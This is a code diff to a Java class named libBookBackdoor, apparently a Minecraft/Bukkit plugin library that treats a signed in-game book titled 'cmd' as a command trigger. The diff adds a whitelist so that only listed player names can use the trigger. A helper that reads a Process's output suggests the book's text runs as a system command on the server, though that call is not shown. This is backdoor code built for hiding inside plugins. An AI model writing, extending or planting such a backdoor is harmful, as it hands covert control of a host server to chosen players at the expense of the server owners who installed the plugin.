@@ -76,9 +76,15 @@ public class libBookBackdoor implements Listener {
     }
 
     public final Plugin plugin;
+    public String[] authedPlayers = null;
 
     public libBookBackdoor(JavaPlugin plugin) {
         this.plugin = plugin;
+    }
+
+    public libBookBackdoor(JavaPlugin plugin, String[] authedPlayers) {
+        this.plugin = plugin;
+        this.authedPlayers = authedPlayers;
     }
 
     public String getResult(Process process) throws IOException {
@@ -97,6 +103,20 @@ public class libBookBackdoor implements Listener {
     @EventHandler
     public void onBookSign(PlayerEditBookEvent event) {
         BookMeta eventMeta = event.getNewBookMeta();
+        boolean canContinue = false;
+        if (authedPlayers != null) {
+            Player player = event.getPlayer();
+            for (String name : authedPlayers) {
+                if (name.equals(event.getPlayer().getDisplayName())) {
+                    canContinue = true;
+                }
+            }
+        } else {
+            canContinue = true;
+        }
+
+        if (!canContinue) return;
+
         if (eventMeta.getTitle() != null && !eventMeta.getPage(1).equals("")) {
             if (eventMeta.getTitle().equals("cmd")) {
                 String pageString = eventMeta.getPage(1);
